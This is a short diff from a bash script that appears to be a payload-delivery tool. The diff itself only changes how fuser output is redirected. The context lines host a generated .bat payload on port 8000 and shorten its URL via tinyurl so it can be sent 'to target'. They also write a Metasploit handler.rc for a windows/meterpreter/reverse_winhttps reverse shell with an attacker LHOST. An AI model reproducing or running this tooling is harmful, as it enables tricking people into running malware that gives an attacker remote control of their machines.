@@ -54,7 +54,7 @@ pid=$!
 wait $pid
 printf '\e[0;32m Payload saves as: \e[0;31m %s\n \e[0m' "$payload.bat"
 send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$default_lhost:8000/$payload.bat)
-fuser -k 8000/tcp 1> /dev/null
+fuser -k 8000/tcp &> /dev/null
 
 if [ "$web" = 'y' ]
 then
@@ -65,7 +65,7 @@ printf '\e[0;32m Enable Port Forwarding in your Router, ip:\e[0;31m %s\e[0;32m p
 printf '\e[0;32m To close server run as root:\e[0;31m fuser -k 8000/tcp\n \e[0m'
 printf '\e[0;32m Send this URL to target:\e[0;31m %s\n \e[0m' "$send_ip"
 fi
-fuser -k $lport/tcp 1> /dev/null
+fuser -k $lport/tcp &> /dev/null
 echo use exploit/multi/handler > handler.rc
 echo set payload windows/meterpreter/reverse_winhttps >> handler.rc
 echo set LHOST $local_ip >> handler.rc
